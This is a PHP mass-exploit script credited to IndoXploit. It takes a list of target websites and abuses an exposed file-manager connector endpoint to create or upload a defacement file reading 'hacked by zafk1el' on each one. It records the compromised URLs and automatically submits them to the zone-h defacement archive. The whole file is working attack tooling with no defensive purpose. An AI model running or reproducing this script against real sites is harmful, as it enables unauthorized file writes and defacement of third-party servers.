<?php
# IndoXploit
// usage : php exploit.php target.txt
//set_time_limit(0);
print "[ ========================================== ]\n";
        print "Bot Mass Exploiter Hosting Nazuka / IDhostinger\n";
        print "Coded by: Ilham ( ID-IM )\n";
        print "Greetz: IndoXploit - ID-IM - LinuxSec\n";
        print "[ ========================================== ]\n\n";
error_reporting(0);

function ngirim($url, $isi) { 
$ch = curl_init ("$url");
	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	  curl_setopt($ch, CURLOPT_POST, 1);
	  curl_setopt($ch, CURLOPT_POSTFIELDS, $isi);
	  curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt ");
	  curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt ");
$data3 = curl_exec($ch);
return $data3;
}
function simpen($isi) {
	$fopen = fopen("hasil3.txt", "a+");
	fwrite($fopen, "$isi\n");
	fclose($fopen);
}
$target = explode("\n", file_get_contents($argv[1]));
if($argv[1]) {
	foreach($target as $korban) {
		if(!preg_match("/^http:\/\//", $korban) AND !preg_match("/^https:\/\//", $korban)) {
			$korban = "http://".$korban;
		}
		$nama_doang = "z.txt";
		
		$isi_nama_doang = base64_encode("hacked by zafk1el"); // uploader
		$decode_isi = base64_decode($isi_nama_doang);
		$encode = base64_encode($nama_doang);
		$fp = fopen($nama_doang,"w");
		fputs($fp, $decode_isi);
		echo "\n[*] Exploiting : $korban \n";
		$url_mkfile = "$korban/_file-manager/php/connector.php?cmd=mkfile&name=$nama_doang&target=l1_Lw";
		$b = file_get_contents("$url_mkfile");
 		$post1 = array(
				"cmd" => "put",
				"target" => "l1_$encode",
				"content" => "$decode_isi",
				);
 		$post2 = array(
 				"current" => "8ea8853cb93f2f9781e0bf6e857015ea",
 				"upload[]" => "@$nama_doang",);
 		$output_mkfile = ngirim("$korban/_file-manager/php/connector.php", $post1);
 		if(preg_match("/$nama_doang/", $output_mkfile)) {
    		echo "[+] $korban/$nama_doang\n";
    		simpen("$korban/$nama_doang");

    		echo "Zone-H: ";
$ch3 = curl_init ("http://www.zone-h.org/notify/single");
						curl_setopt ($ch3, CURLOPT_RETURNTRANSFER, 1);
						curl_setopt ($ch3, CURLOPT_POST, 1);
						curl_setopt ($ch3, CURLOPT_POSTFIELDS, "defacer=zafk1el&domain1=$korban/$nama_doang&hackmode=1&reason=1&submit=Send");  // here put ur name on zone-h
						
        if (preg_match ("/color=\"red\">OK<\/font><\/li>/i", curl_exec ($ch3))){
                echo  " Ok  "."\n";
        }else{
                echo " No"."\n"; }

		} else {
			
			$upload_ah = ngirim("$korban/_file-manager/php/connector.php?cmd=upload", $post2);
			if(preg_match("/$nama_doang/", $upload_ah)) {
    			echo "[+] $korban/$nama_doang\n";
    			simpen("$korban/$nama_doang");

    			echo "Zone-H: ";
$ch3 = curl_init ("http://www.zone-h.org/notify/single");
						curl_setopt ($ch3, CURLOPT_RETURNTRANSFER, 1);
						curl_setopt ($ch3, CURLOPT_POST, 1);
						curl_setopt ($ch3, CURLOPT_POSTFIELDS, "defacer=zafk1el&domain1=$korban/$nama_doang&hackmode=1&reason=1&submit=Send");  // here put ur name on zone-h
						
        if (preg_match ("/color=\"red\">OK<\/font><\/li>/i", curl_exec ($ch3))){
                echo  " Ok  "."\n";
        }else{
                echo " No"."\n"; }
                
			} else {
				echo "[-] Exploit Failed\n";
			}
		}
	}
}
?>
